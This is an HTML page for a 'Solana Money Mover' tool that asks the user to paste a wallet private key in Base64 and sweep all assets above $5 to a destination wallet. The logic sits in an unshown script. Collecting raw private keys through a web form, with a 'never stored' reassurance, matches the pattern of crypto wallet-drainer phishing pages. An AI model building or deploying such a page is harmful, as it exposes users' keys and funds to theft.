<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Money Mover</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="style.css" rel="stylesheet">
</head>
<body>
    <div class="container mt-5">
        <div class="row justify-content-center">
            <div class="col-md-8">
                <div class="card shadow">
                    <div class="card-header bg-primary text-white">
                        <h3 class="card-title mb-0">ðŸ’° Solana Money Mover</h3>
                    </div>
                    <div class="card-body">
                        <!-- Connection Section -->
                        <div id="connection-section" class="mb-4">
                            <h5>1. Connect Wallet</h5>
                            <div class="mb-3">
                                <label class="form-label">Wallet Public Key</label>
                                <input type="text" class="form-control" id="publicKey" placeholder="Enter your wallet public key">
                            </div>
                            <button class="btn btn-primary" id="connectWallet">Connect Wallet</button>
                        </div>

                        <!-- Transfer Section (Hidden until connected) -->
                        <div id="transfer-section" class="d-none mb-4">
                            <h5>2. Transfer Assets</h5>
                            <div class="alert alert-warning">
                                <strong>Warning:</strong> This will transfer all assets worth more than $5 to the destination wallet.
                            </div>
                            
                            <div class="mb-3">
                                <label class="form-label">Private Key (Base64)</label>
                                <input type="password" class="form-control" id="privateKey" placeholder="Enter your private key in Base64 format">
                                <div class="form-text">
                                    Your private key is never stored on our servers and is only used for the transaction.
                                </div>
                            </div>
                            
                            <div class="mb-3">
                                <label class="form-label">Destination Wallet</label>
                                <input type="text" class="form-control" id="destinationWallet" placeholder="Enter destination wallet address">
                            </div>
                            
                            <button class="btn btn-success" id="transferAssets">Transfer All Assets</button>
                        </div>

                        <!-- Results Section -->
                        <div id="results-section" class="d-none">
                            <h5>Transfer Results</h5>
                            <div id="results-content"></div>
                        </div>

                        <!-- Loading Spinner -->
                        <div id="loading" class="d-none text-center">
                            <div class="spinner-border text-primary" role="status">
                                <span class="visually-hidden">Loading...</span>
                            </div>
                            <p class="mt-2" id="loading-text">Processing...</p>
                        </div>
                    </div>
                </div>
                
                <!-- Session Info -->
                <div id="session-info" class="mt-3 text-center text-muted small d-none">
                    Session: <span id="session-id"></span>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="script.js"></script>
</body>
</html>
